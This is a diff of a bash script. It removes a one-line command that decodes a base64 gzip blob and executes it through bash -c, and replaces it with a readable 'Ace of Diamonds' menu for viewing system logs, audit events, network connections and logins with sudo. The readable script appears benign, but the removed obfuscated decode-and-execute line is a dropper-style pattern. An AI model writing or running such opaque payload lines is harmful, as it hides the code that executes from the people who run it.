@@ -1,1 +1,82 @@
-bash -c "$(echo H4sICGjyXmcAA0FjZV9vZl9EaWFtb25kcwDNV21v2jAQ/p5fcWNItNsSSumbhvahYnyo1E3TWlWbNqlynQM8go1sB5a1/e87hwwaIAlF0zRLoNjO3T333Bu8fNG8E7J5x8zQ87pfzz++a3w/aLe/tTrtk3HD+9y76l1nRwe090xixkre4hSlNXv7cO8BrdlQRAhWx9iBUKVHbvEImV7skA8V+Ai1+r0z9FjL39TSx9ut1ybxB8itc46g+vBeMMIcmtzdQ6n8ByWFVRqYDOFSDeAqMRbH0EvdLpHfHn65/epVJN8K4EbgDCIxRTBz2JEamG3lD4OF8xOtOBoDXCOzQknApfuF8u0ArjXjI+i7lGA81aAmqFMVptL+UQAX0kyQ2yfowcTjMdMCq+WPl/gl2pnSI+BKStKXM18ofxLAuWRR8gshNqiddaoP+laxJXesmAqblMifBnBFWc+Hc9b7hMN5I/qCb8XfWQC9n8JujHl1/HbPv3lhpvVOlbm4o9CH4E+g1h0qwfEt2eHp07LImUGozw9ByMW5W6393DZ9PdcTNkBIe4NLYSEH61m817U6et0FqwCJpv0gCJaoV7WaOFTwQ8WaAsptBH5/7ZVOJ3d0uCvgLOcc5oKyeR7SGFgcCkvc+0ZIYrbWgiHdAxuoGuXJQCMFpfel173pratbRfdJO0BMJjDCxHFHJWGFjLEU1Dz2Elrgmyri2rsSlzYLR9vmflEKcFXXpcsQavipKoe+OdPCIoRoqf4xfFsRAEYVn5au34dmEfMRAaxi42hXNrLW5/jY1P2el0N/8FsVssRBZ7MRNO4nlKUW6q03UD+kT5s+x4+NIs/+fSod/4UaTBs1bpwAz+8g5K9vY8kmW0b/ZFcH5oPH4S8ePSU5HDFjwWf/TyRPdyWiYoJWwnOtUVqikDyjBAidd1lpkzo3xLKLyiLKOq0vCFsms20TOFv3ftVPN+kp3KWE35FLoypbr6ptXcgpi0SYjW/3Ky2hlsaELLH9xAoaxtNNqCR6jyv/BLzfeHUeVUgMAAA= | base64 -d | gunzip)"
+#!/bin/bash
+
+CYAN='\033[1;36m'
+RESET='\033[0m'
+
+sysmon_events() {
+    while true; do
+        clear
+        echo -e "${CYAN}"
+        echo "     __________________________________________"
+        echo "    |              Ace of Diamonds             |"
+        echo "    |        Monitor and Log System Events     |"
+        echo "    |__________________________________________|"
+        echo "    |                                          |"
+        echo "    |  1. View live system logs                |"
+        echo "    |  2. Monitor process creation events      |"
+        echo "    |  3. Track file access operations         |"
+        echo "    |  4. Inspect system log summaries         |"
+        echo "    |  5. Monitor network connections          |"
+        echo "    |  6. Analyze user login/logout activity   |"
+        echo "    |  7. Search logs for specific events      |"
+        echo "    |  8. Exit                                 |"
+        echo "    |__________________________________________|"
+        echo -e "${RESET}"
+
+        read -p "Choice: " choice
+        case $choice in
+            1)
+                clear
+                echo -e "${CYAN}Viewing live system logs (Ctrl+C to exit)...${RESET}"
+                sudo journalctl -f
+                ;;
+            2)
+                clear
+                echo -e "${CYAN}Monitoring process creation events...${RESET}"
+                sudo journalctl -u auditd --since "1 hour ago" | grep "EXECVE"
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            3)
+                clear
+                echo -e "${CYAN}Tracking file access operations...${RESET}"
+                echo -e "${CYAN}Logs of file read/write detected:${RESET}"
+                sudo ausearch -f / --since "1 hour ago" | less
+                ;;
+            4)
+                clear
+                echo -e "${CYAN}Inspecting system log summaries...${RESET}"
+                sudo journalctl --since "today" | awk '{print $1, $2, $3, $5}' | less
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            5)
+                clear
+                echo -e "${CYAN}Monitoring active network connections (Ctrl+C to exit)...${RESET}"
+                sudo ss -tunap | less
+                ;;
+            6)
+                clear
+                echo -e "${CYAN}Analyzing user login/logout activity:${RESET}"
+                last -a | less
+                echo -e "${CYAN}Press any key to continue...${RESET}"
+                read -n 1 -s
+                ;;
+            7)
+                clear
+                echo -e "${CYAN}Search logs for specific events.${RESET}"
+                read -p "Enter keyword to search for: " keyword
+                sudo journalctl | grep -i "$keyword" | less
+                ;;
+            8)
+                echo -e "${CYAN}Exiting...${RESET}"
+                break
+                ;;
+            *)
+                echo -e "${CYAN}Invalid choice. Try again.${RESET}"
+                ;;
+        esac
+    done
+}
+
+sysmon_events
